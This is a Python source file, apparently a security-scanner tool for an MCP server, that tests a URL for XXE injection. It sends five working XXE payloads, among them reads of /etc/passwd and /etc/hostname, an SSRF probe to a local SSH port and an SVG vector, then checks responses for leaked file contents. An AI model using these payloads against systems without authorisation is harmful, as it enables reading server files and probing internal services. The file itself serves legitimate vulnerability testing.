"""OWASP A05/A08 — XXE (XML External Entity) injection test.
Sends XML payloads with external entities to detect XXE vulnerabilities."""
from __future__ import annotations

from typing import Any

import httpx

from mcp_servers.tools._common import safe_filename, sanitize_input, save_to_workspace

_XXE_PAYLOADS: list[tuple[str, str, str]] = [
    (
        "file_read_etc_passwd",
        "application/xml",
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
    ),
    (
        "file_read_etc_hostname",
        "application/xml",
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root>&xxe;</root>',
    ),
    (
        "blind_xxe",
        "application/xml",
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "file:///dev/null"> %xxe;]><root>test</root>',
    ),
    (
        "ssrf_xxe",
        "application/xml",
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://127.0.0.1:22/">]><root>&xxe;</root>',
    ),
    (
        "svg_xxe",
        "image/svg+xml",
        '<?xml version="1.0"?>'
        '<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        '<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">'
        '<text>&xxe;</text></svg>',
    ),
]

_ERROR_INDICATORS = [
    "SAXParseException",
    "XMLReaderException",
    "Entity resolution",
    "org.xml.sax",
    "javax.xml",
    "Error:",
    "warning:",
    "file:/",
    "/etc/passwd",
    "/etc/hostname",
    "root:x:",
]


def _check_xxe_response(text: str, response_size: int) -> dict[str, bool]:
    """Check if the response indicates XXE success."""
    indicators = {
        "leaked_file": any(indicator in text for indicator in ["root:x:", "daemon:x:", "bin:x:", "nobody:x:"]),
        "error_reflection": any(indicator in text for indicator in _ERROR_INDICATORS),
        "has_content": response_size > 50,
    }
    indicators["vulnerable"] = indicators["leaked_file"] or indicators["error_reflection"]
    return indicators


def xxe_test(url: str, method: str = "POST") -> dict[str, Any]:
    """Test a URL for XXE (XML External Entity) injection.

    Sends XML payloads with various entity types — file reads, SSRF probes,
    SVG vectors, and blind XXE — via POST or PUT.

    Args:
        url: Target URL that processes XML (e.g. http://target/api/parse)
        method: HTTP method (POST, PUT)
    """
    url = sanitize_input(url)
    method = sanitize_input(method).upper() or "POST"
    if not url:
        return {"status": "error", "error": "url required"}

    results = []
    for label, content_type, body in _XXE_PAYLOADS:
        try:
            resp = httpx.request(
                method=method,
                url=url,
                content=body,
                headers={"Content-Type": content_type},
                timeout=15,
            )
            checks = _check_xxe_response(resp.text, len(resp.content))
            results.append({
                "payload_label": label,
                "http_code": resp.status_code,
                "response_size": len(resp.content),
                "vulnerable": checks["vulnerable"],
                "leaked_file": checks["leaked_file"],
                "error_reflection": checks["error_reflection"],
            })
        except httpx.HTTPError as exc:
            results.append({
                "payload_label": label,
                "error": str(exc),
            })

    vulnerable = [r for r in results if r.get("vulnerable")]
    out = "\n".join(
        f"{r['payload_label']}: {r.get('http_code', 'ERR')} "
        f"({'VULNERABLE' if r.get('vulnerable') else 'not vulnerable'})"
        for r in results
    )
    log_path = save_to_workspace(safe_filename(url, "xxe_test"), out)

    return {
        "status": "success",
        "tool": "xxe_test",
        "target": url,
        "summary": f"{len(vulnerable)}/{len(results)} payloads indicate XXE — potential vulnerability"
        if vulnerable else "No XXE indicators found",
        "results": results,
        "vulnerable_count": len(vulnerable),
        "full_output_file": log_path,
    }
